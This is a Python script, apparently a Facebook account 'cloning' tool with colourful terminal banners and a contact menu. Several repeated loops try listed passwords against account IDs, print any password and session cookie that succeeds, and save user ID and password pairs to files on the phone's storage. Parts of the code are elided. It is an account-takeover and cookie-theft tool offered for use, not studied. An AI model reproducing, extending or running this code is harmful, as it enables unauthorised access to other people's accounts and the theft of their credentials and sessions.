#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
#Sc Make By DX_AJMIR_HOSSAIN 
#Github DX-AJMIR-HOSSAIN
#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
#••••••••••••••••••••••••IMPORT MODULE•••••••••••••••••••••••#
#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
...
logo =("""
 ╔═════════════════════╗╔════════════════════════════╗   
 ║  ▄▄ • ▪  ·▄▄▄▄▄▄▄▄  ║║ Developar : DX-AJMIR HOSSAIN║
 ║ ▐█ ▀ ▪██ ▐▄▄·•██    ║║ Admin     : DX-AJMIR HOSSAIN║
 ║ ▄█ ▀█▄▐█·██▪  ▐█.▪  <> Github    : DX-AJMIR-HOSSAIN        ║
 ║ ▐█▄▪▐█▐█▌██▌. ▐█▌·  ║║ Stetus    : Free   ║
 ║ ·▀▀▀▀ ▀▀▀▀▀▀  ▀▀▀   ║║ Code      : 02             ║
 ╚═════════════════════╝╚════════════════════════════╝""") 
cloninglogo =("""
\033[1;97m ╔══════════════════════════════════════╗   
 \033[1;97m║ \033[1;95m    ___  _  __  ___     ____  __________ \033[1;97m ║
\033[1;97m║ \033[1;92m  / _ \| |/_/ / _ |__ / /  |/  /  _/ _ \\033[1;97m ║
\033[1;97m║ \033[1;93m / // />  <  / __ / // / /|_/ // // , _/\033[1;97m ║
\033[1;97m║ \033[1;94m/____/_/|_| /_/ |_\___/_/  /_/___/_/|_| \033[1;97m ║
 \033[1;97m╚══════════════════════════════════════╝
 \033[1;97m╔══════════════════════════════════════╗   
 \033[1;97m║\033[1;95mOwner \033[1;90m<\033[1;92m•\033[1;90m> \033[1;93mDX AJMIR HOSSAIN \033[1;90m<\033[1;92m•\033[1;90m] \033[1;95mV-01\033[1;97m║
 \033[1;97m╚══════════════════════════════════════╝
                         """)
contactinfo = (""" 
\033[1;97m ╔══════════════════════════════════════╗   
...
\033[1;97m║ \033[1;94m/____/_/|_| /_/ |_\___/_/  /_/___/_/|_| \033[1;97m ║
 \033[1;97m╚══════════════════════════════════════╝
 \033[1;97m╔══════════════════════════════════════╗   
 \033[1;97m║   \033[1;95m Owner \033[1;90m<\033[1;92m•\033[1;90m> \033[1;93mDX AJMIR HOSSAIN     \033[1;97m║
 \033[1;97m╚══════════════════════════════════════╝
                         """)
def Cloning_Linex():
...
def Contact():
	...
	if Tymin in ['4']:
		os.system('xdg-open https://facebook.com/groups/3202079300059919/')
	if Tymin in ['5']:
		os.system('xdg-open https://chat.whatsapp.com/Bv0gJ213JVj3Mnj8eb9zWn')
	if Tymin in ['6']:
		os.system('xdg-open wa.me/+8801813225678')
	if Tymin in ['7']:
		os.system('xdg-open https://t.me/DX_AJMIR_HOSSAIN')
	if Tymin in ['8']:
		os.system('xdg-open https://github.com/DX-AJMIR-HOSSAIN')
	if Tymin in ['9']:
		Nodi_Hasan()
	if Tymin in ['0']:
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mDX_Ajmir-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;32m'+coki);open('/sdcard/HASAN-OK-M1.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('  \033[1;90m[DX-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/HASAN-CP-M1.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mDX_Ajmir-OᏦ\033[1;96m]\033[1;93m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;91m'+coki);open('/sdcard/HASAN-OK-M2.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mDX_Ajmir-OᏦ\033[1;96m]\033[1;97m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;93mCOOKIE : \033[1;95m'+coki);open('/sdcard/HASAN-OK-M3.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mDX_Ajmir-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');open('/sdcard/HASAN-OK-M4.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mDX_Ajmir-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;97m'+coki);open('/sdcard/HASAN-OK-M5.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
